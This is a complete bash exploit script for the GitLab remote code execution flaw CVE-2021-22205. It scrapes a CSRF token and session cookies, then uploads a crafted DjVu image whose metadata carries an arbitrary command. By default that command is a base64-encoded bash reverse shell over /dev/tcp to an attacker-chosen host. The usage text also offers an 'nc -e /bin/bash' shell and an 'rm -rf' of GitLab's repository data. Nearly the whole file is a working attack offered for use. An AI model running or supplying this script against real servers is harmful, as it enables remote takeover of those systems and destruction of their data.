#!/bin/bash

function usage()
{
	printf "Usage: cve-2021-22205.sh [options]\n"
	printf "Options:\n"
	printf "\t-h,--help\t\tShow this help\n"
	printf "\t-t,--target\t\tSet the target server (i.e. \"http://gitlab.example.com\")\n"
	printf "\t-i,--reverse-ip\t\tSet the IP to connect back to\n"
	printf "\t-p,--reverse-port\tSet the port to connect back to\n"
	printf "\t-c,--command\t\tSet the raw command to run instead of the built-in reverse shell (i.e. \"nc -e /bin/bash 127.0.0.1 1337\")\n"
	printf "Examples:\n"
	printf "\tUse the built-in reverse shell payload:\n\t\tcve-2021-22205.sh -t http://gitlab.example.com -i 127.0.0.1 -p 1337\n"
	printf "\tRun a custom command:\n\t\tcve-2021-22205.sh -t http://gitlab.example.com -c \"rm -rf /var/opt/gitlab/git-data/*\"\n"
}

function create_exploit_image()
{
	printf "\x41\x54\x26\x54\x46\x4f\x52\x4d\x00\x00\x00\xb5\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61\x00\x00\x00\x8f\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b%s\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a" "$1"
}

function exploit()
{
	request=$(curl -s -k -i $1/users/sign_in)
	token="X-CSRF-Token: $(echo $request | sed 's/.*<meta name=\"csrf-token\" content=\"\([^\"]*\).*/\1/g')"
	cookies="sidebar_collapsed=false; event_filter=all; hide_auto_devops_implicitly_enabled_banner_1=false; $(echo $request | sed 's/.*\(_gitlab_session=[^;]*\).*/\1/g'); $(echo $request | sed 's/.*\(experimentation_subject_id=[^;]*\).*/\1/g')"
	file="$(mktemp -u)"
	create_exploit_image "$2" > $file
	echo "Attempting to exploit..."
	result="$(curl --max-time 1 -s -k -b "$cookies" -H "$token" -H "Referer: $1/uploads/user" -H "Accept: application/json" -X POST -F "file=@$file;filename=\"whatever.jpg\"" $1/uploads/user 2>&1)"
	if [[ -z "$result" || "$result" == "Failed to process image" ]]
	then
		echo "The command (probably) executed, or the server timed out"
	else
		echo "Failed to run command!"
	fi
	rm $file
}

function create_reverse_payload()
{
	b64=$(echo "bash -c 'bash -i >&/dev/tcp/$1/$2 0>&1'" | base64)
	echo "echo $b64 | base64 -d | bash"
}

CURRENT_IP=$(ip -br a | grep $(ip route | grep default | cut -d' ' -f5) 2>/dev/null | sed 's/\(\s\)\s*/\1/g' | cut -d' ' -f3 | cut -d'/' -f1)

TARGET=
USE_REVERSE=yes
IP=$CURRENT_IP
PORT=1337
COMMAND=

while [[ $# -gt 0 ]]
do
	case $1 in
		-h|--help)
			usage
			exit 0
			;;
		-t|--target)
			if [[ ! $# -gt 1 ]]
			then
				echo "Expected argument for $1!"
				usage
				exit 1
			fi
			TARGET=$2
			shift
			;;
		-i|--reverse-ip)
			if [[ ! $# -gt 1 ]]
			then
				echo "Expected argument for $1!"
				usage
				exit 1
			fi
			IP=$2
			shift
			;;
		-p|--reverse-port)
			if [[ ! $# -gt 1 ]]
			then
				echo "Expected argument for $1!"
				usage
				exit 1
			fi
			PORT=$2
			shift
			;;
		-c|--command)
			if [[ ! $# -gt 1 ]]
			then
				echo "Expected argument for $1!"
				usage
				exit 1
			fi
			USE_REVERSE=no
			COMMAND=$2
			shift
			;;
		*)
			echo "Unknown argument \"$1\""
			usage
			exit 1
			;;
	esac
	shift
done

if [[ -z "$TARGET" ]]
then
	echo "At a minimum the target must be specified!"
	usage
	exit 1
fi

if [[ -z "$IP" && -z "$CURRENT_IP" ]]
then
	echo "Failed to automatically determine the reverse shell IP, please specify manually!"
	usage
	exit 1
fi

if [[ "$USE_REVERSE" == "yes" ]]
then
	COMMAND="$(create_reverse_payload $IP $PORT)"
fi

exploit $TARGET "$COMMAND"
